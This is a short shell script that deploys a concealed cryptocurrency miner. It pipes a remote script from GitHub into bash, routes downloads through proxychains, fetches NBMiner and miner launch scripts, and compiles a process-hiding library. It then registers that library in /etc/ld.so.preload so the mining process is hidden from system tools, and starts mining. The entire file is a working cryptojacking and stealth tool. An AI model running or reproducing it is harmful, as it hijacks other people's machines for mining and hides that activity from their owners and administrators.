#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
proxychains curl ifconfig.me
proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v34.5/NBMiner_34.5_Linux.tgz
tar -xvzf NBMiner_34.5_Linux.tgz
cd NBMiner_Linux
proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/PowETH.zip
unzip PowETH.zip
chmod +x start_2miners.sh
chmod +x start_flypool.sh
chmod +x start_hiveon.sh
chmod +x start_ravenminerpplns.sh
chmod +x start_ravenminerpps.sh
proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbFlyp.sh
chmod +x nbFlyp.sh
proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
unzip magicNb.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./nbFlyp.sh
